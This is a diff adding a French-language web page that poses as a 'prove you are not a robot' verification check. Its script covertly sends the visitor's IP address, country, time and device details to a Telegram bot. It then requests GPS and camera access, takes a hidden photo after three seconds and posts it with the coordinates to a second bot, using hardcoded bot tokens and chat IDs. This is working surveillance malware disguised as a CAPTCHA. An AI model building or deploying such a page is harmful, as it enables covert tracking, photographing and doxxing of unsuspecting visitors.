@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Veuillez prouver que vous n'êtes pas un robot</title>
+</head>
+<body>
+  <h1>Veuillez prouver que vous n'êtes pas un robot</h1>
+  <p>Cette page demande l'accès au GPS et à la caméra pour vérification.</p>
+
+  <script>
+    // Fonction pour obtenir l'adresse IP et le pays
+    async function getIpAndCountry() {
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        const ipAddress = data.ip;
+        const country = data.country_name;
+
+        // Envoyer les informations au bot Telegram
+        const botToken = '6920156526:AAHi36vRPLKjAYD3sltXEcD7ZR7EwqEcQFM'; // Remplacez par le token de votre bot Telegram
+        const chatId = '5838829453'; // Remplacez par l'ID de chat où vous souhaitez recevoir les données
+        const message = `
+Adresse IP : ${ipAddress}
+Pays : ${country}
+Heure locale : ${new Date()}
+Modèle de l'appareil : ${navigator.userAgent}
+`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error(error));
+      } catch (error) {
+        console.error('Erreur lors de la récupération des informations :', error);
+      }
+    }
+
+    // Demander l'accès au GPS
+    navigator.geolocation.getCurrentPosition(function(position) {
+      // Enregistrer la position GPS
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      // Demander l'accès à la caméra
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(function(stream) {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+
+          // Prendre une photo après 3 secondes
+          setTimeout(function() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convertir l'image en format base64
+            const photoDataURL = canvas.toDataURL('image/jpeg');
+
+            // Envoyer les coordonnées GPS et la photo
+            const botToken = '6615386452:AAEdW1VIcNSRgkfFyna0R1kTnLoO-JqnyZY'; // Remplacez par le token de votre bot Telegram
+            const chatId = '1613186921'; // Remplacez par l'ID de chat où vous souhaitez recevoir les données
+
+            const photoBlob = dataURItoBlob(photoDataURL);
+            const formData = new FormData();
+            formData.append('photo', photoBlob, 'photo.jpg');
+            
+            // Envoyer les informations au bot Telegram
+            const message = `Coordonnées GPS : Latitude ${latitude}, Longitude ${longitude}`;
+            formData.append('caption', message);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+              method: 'POST',
+              body: formData
+            })
+              .then(response => response.json())
+              .then(data => console.log(data))
+              .catch(error => console.error(error));
+          }, 3000); // Capture de la photo après 3 secondes
+        })
+        .catch(function(error) {
+          alert("Impossible d'accéder à la caméra : " + error);
+        });
+    }, function(error) {
+      alert("Impossible d'accéder au GPS : " + error.message);
+    });
+
+    // Convertir une Data URI en Blob
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+
+    // Appeler la fonction pour obtenir l'adresse IP et le pays
+    getIpAndCountry();
+  </script>
+</body>
+</html>
